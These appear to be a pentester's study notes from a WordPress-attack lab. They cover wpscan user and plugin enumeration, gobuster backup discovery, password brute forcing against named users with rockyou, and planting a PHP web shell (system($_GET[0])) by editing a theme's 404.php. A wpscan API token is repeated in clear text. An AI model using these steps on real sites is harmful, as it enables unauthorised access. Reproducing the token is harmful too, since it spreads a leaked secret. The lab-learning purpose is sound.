check `/robots.txt`
check `/wp-login, /wp-admin` 
run wpscan default
run wpscan agressive
run dirbuster backup discovery mode 
enumerate users
```shell
# scan themes, plugins, enumerate users
wpscan --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs -e u -t 500 --url http://ir.ad.someorg.local

# agressive mode (run in background)
wpscan --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs --url http://xxx -e ap --plugins-detection aggressive

# backup discovery
gobuster discover backup mode:
gobuster -u url -w lst.txt -d
-d => backup discovery
```

launch a bruteforce attack against a single user
```shell-session
wpscan --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs --url http://ir.ad.someorg.local -P passwords.txt -U ilsomeorg.localwp
```
wordlist
Passwords/Common-Credentials/darkweb2017_top-100.txt
```
$ curl -s http://blog.ad.someorg.local | grep WordPress

<meta name="generator" content="WordPress 5.8" />
```

#### Themes`
```
 curl -s http://blog.ad.someorg.local | grep themes
```

#### what plugins installed?

```
 curl -s http://blog.ad.someorg.local | grep plugins
<link  id='contact-form-7-css' /plugins/contact-form-7/i' 
<link rel='stylesheet' id='wpdiscuz-frontend-css-css' 
```
 look for CVEs on them.
## what users exist?

The `--enumerate` flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups.
`run wpscan in docker`
```
$ sudo docker run -it --rm --network host wpscanteam/wpscan --url http://blog.ad.someorg.local --enumerate --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs

```


`wpscan password bruteforce`
```shell-session
$ sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.ad.someorg.local
```




================================================
`lab`
![](Pasted%20image%2020250211132204.png)
after browsing the readme, mail-masta 1 is in use.

`run wpscan in docker`
```
└─$ sudo docker run -it --rm --network host wpscanteam/wpscan --url http://blog.ad.someorg.local --enumerate --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs

```


=========================================
## Some notes that might help you

WordPress stores its plugins in the `wp-content/plugins` directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the `wp-content/themes` directory. These files should be carefully enumerated as they may lead to RCE.


# AUTHORIZATION LEVELS
There are five types of users on a standard WordPress installation.

1. Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
2. Editor: An editor can publish and manage posts, including the posts of other users.
3. Author: They can publish and manage their own posts.
4. Contributor: These users can write and manage their own posts but cannot publish them.
5. Subscriber: These are standard users who can browse posts and edit their profiles.

## webshell:
1. manual with twentyone
2. auto with metasploit

browse to `http://ir.ad.someorg.local/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty` to edit the 404.php file for the inactive theme `Twenty Twenty` and add in a PHP web shell to get remote code execution. After editing this page and achieving code execution following the steps in the [Attacking WordPress](https://academy.hackthebox.com/module/113/section/1208) section of the `Attacking Common Applications`
we can record yet another finding for `Weak WordPress Admin Credentials` and recommend that our client implement several hardening measures if they plan to leave this WordPress site exposed externally.



### WP Webshells
#### Creating a webshell using the php module
select an unused theme and an unusual page, `404.php` select ninteen and 404
![](Pasted%20image%2020250211200810.png)
##### Simple test
```php
system($_GET[0]);
```

#### interactive webshell

